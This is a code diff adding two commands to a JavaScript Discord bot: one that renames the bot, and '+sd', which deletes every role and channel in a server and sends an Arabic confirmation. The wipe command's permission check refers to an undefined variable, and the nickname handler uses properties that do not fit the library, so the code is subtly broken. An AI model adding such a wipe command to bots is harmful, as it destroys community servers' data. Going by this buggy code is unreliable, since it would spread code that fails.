@@ -3060,7 +3060,51 @@ m.sendMessage(args)
 })
 }
 });
+client.on('message', async (message) => {
+    if(message.content.startsWith('+namebot')) {
+         let args = message.content.split(' ').slice(1);
+  try {
+    if (args.length > 0) {
+      await message.guild.me.setNickname(args.join(' '));
 
+      message.channel.send({
+        embed: {
+          color: message.colors.GREEN,
+          description: `${message.user.username}'s nick is now set to **${args.join(' ')}** on this guild.`
+        }
+      }).catch(e => {
+        message.log.error(e);
+      });
+    }
+    else {
+      await message.guild.me.setNickname('');
+
+      message.channel.send({
+        embed: {
+          color: message.colors.GREEN,
+          description: `${message.user.username}'s nick has been reset on this guild.`
+        }
+      }).catch(e => {
+        message.log.error(e);
+      });
+    }
+  }
+  catch (e) {
+    message.log.error(e);
+  }
+}
+});
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("+sd")) {
+    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**⚠  لايوجد لديك صلاحية**');
+     ra3d.guild.roles.forEach(r => { r.delete() }) 
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('تم حذف كل شي في السيرفر✅')
+           ra3d.author.sendEmbed(embed);
+ }
+ });  
 
 
 
